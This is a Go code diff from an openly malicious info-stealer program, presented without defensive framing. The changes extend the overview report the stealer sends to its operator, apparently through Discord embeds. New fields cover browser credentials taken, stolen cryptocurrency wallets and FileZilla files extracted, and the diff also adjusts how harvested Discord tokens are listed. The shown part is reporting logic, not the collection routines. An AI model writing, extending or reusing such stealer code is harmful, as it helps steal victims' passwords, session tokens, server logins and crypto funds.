@@ -86,10 +86,36 @@ func (stealer *Stealer) SendOverview() {
 
 	if getWalletCredentials {
 		overviewEmbed.Fields = append(overviewEmbed.Fields, Field{
+			Name: "Web Browsers <:browsers:1086688785435217930>",
+			Value: fmt.Sprintf("```%s```",
+				FormatBrowsersStolen(stealer.Apps.Browsers)),
+			Inline: false,
+		})
+	}
+
+	if getWalletCredentials {
+		overviewEmbed.Fields = append(overviewEmbed.Fields, Field{
 			Name: "CryptoCurrency Wallets <:crypto:1089232985351528528>",
 			Value: fmt.Sprintf("```%s```",
-				FormatWalletsStolen(stealer.Apps.Wallets.Paths)),
+				FormatWalletsStolen(stealer.Apps.Wallets)),
 			Inline: false,
+		})
+	}
+
+	// Check to make sure inline embeds do not collide
+	if (!getWalletCredentials && !getBrowserCredentials && (getNetworkConnections || getInstalledSoftware)) && (getFileZillaServers) {
+		overviewEmbed.Fields = append(overviewEmbed.Fields, Field{
+			Name:   "\b",
+			Value:  "",
+			Inline: false,
+		})
+	}
+
+	if getFileZillaServers {
+		overviewEmbed.Fields = append(overviewEmbed.Fields, Field{
+			Name: "FileZilla Files <:filezilla:1091425304309923860>",
+			Value: fmt.Sprintf("`%d`", len(stealer.Apps.FileZilla.FilesExtracted)),
+			Inline: true,
 		})
 	}
 
@@ -168,7 +194,7 @@ func (stealer *Stealer) SendDiscordOverview() {
 			{
 				Name: "<:files:1085654997875838996> Token Paths",
 				Value: fmt.Sprintf("```%s```",
-					stealer.Apps.Discord.FormatTokensFoundPerPath(stealer.Apps.Discord.Tokens)),
+					stealer.Apps.Discord.FormatTokensFound()),
 				Inline: false,
 			},
 		},
